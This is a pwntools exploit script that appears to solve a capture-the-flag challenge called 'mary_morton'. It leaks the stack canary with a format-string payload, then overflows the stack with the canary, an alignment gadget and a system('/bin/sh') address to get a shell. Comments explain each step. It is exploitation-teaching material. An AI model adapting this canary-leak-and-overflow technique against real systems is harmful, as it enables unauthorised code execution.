from pwn import *

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
binary = ELF("./mary_morton")
#libc = ELF("")
#env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}


# 1. Use format string info leak to display Canary.
# 2. Overflow Option #1 to perform Stack Oveflow with leaked Canary
# 3. use system() for win.

# system('/bin/sh') caveat:
# vfprintf() or do_system() in the 64 bit challenges then ensure the stack is 16 byte aligned 
# before returning to GLIBC functions such as printf() and system(). The version of GLIBC packaged 
# with Ubuntu 18.04 uses movaps instructions to move data onto the stack in some functions. 
# The 64 bit calling convention requires the stack to be 16 byte aligned before a call instruction 
# but this is easily violated during ROP chain execution, causing all further calls from 
# that function to be made with a misaligned stack.

# Variables
binsh = 0x4008da
ret = 0x400659


p = process("./mary_morton")
#p = gdb.debug("./mary_morton", '''
#break *0x400826
#break *0x400960
#break *0x4009c8
#''')

# format string payload
payload = ""
payload += "%p " * 31


# Weapons Menu: Format String
print p.recv()
p.sendline("2")

# format string info. leak: Stack Canary
p.sendline(payload)
p.recv(415)
canary_leak = int(p.recv(16), 16)
print "\nCanary Leak: ", hex(canary_leak)

# Weapons Menu: Stack Overflow
p.sendline("1")

# stack overflow payload
payload2 = ""
payload2 += "A" * 136
payload2 += p64(canary_leak) # <- Stack Canary goes here
payload2 += "C" * 8
payload2 += p64(ret)
payload2 += p64(binsh) # <- system('/bin/sh') payload goes here

# Stack Overflow with Canary Leak
p.sendline(payload2)

p.interactive()
